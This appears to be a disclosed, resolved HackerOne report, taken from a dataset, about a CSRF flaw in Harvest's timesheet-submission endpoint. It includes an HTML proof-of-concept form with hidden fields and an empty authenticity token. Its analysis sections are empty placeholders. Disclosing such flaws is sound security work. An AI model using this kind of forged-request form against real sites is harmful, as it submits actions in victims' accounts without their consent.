---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '164546'
original_report_id: '164546'
title: CSRF bypass on Submit Time sheet for Approval
weakness: Cross-Site Request Forgery (CSRF)
team_handle: harvest
created_at: '2016-08-30T20:45:16.080Z'
disclosed_at: '2017-08-18T20:19:06.817Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF bypass on Submit Time sheet for Approval

## Metadata

- HackerOne Report ID: 164546
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: harvest
- Disclosed At: 2017-08-18T20:19:06.817Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,

Description : There is a Authentication token is provided for submitting Time sheet for approval. Also there is a Referral given in header. But both are not validating on server side which leads to successful CSRF attack. 

HTML POC : 

<html>
<body>
<form action="https://vijaygangani.harvestapp.com/daily/review" method="post">
<input type="hidden" name="from_timesheet_beta" value="true">
<input type="hidden" name="from_screen" value="daily">
<input type="hidden" name="return_to" value="\time">
<input type="hidden" name="of_user" value="">
<input type="hidden" name="submitted_date" value="244">
<input type="hidden" name="submitted_date_year" value="2016">
<input type="hidden" name="submitted_date" value="244">
<input type="hidden" name="authenticity_token" value="">
<input type="hidden" name="period_begin" value="242">
<input type="hidden" name="period_begin_year" value="2016">
<input type="submit">
</body>
</html>



Let me know if you need any other details regarding this.

Best Regards !
Vijay Kumar

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
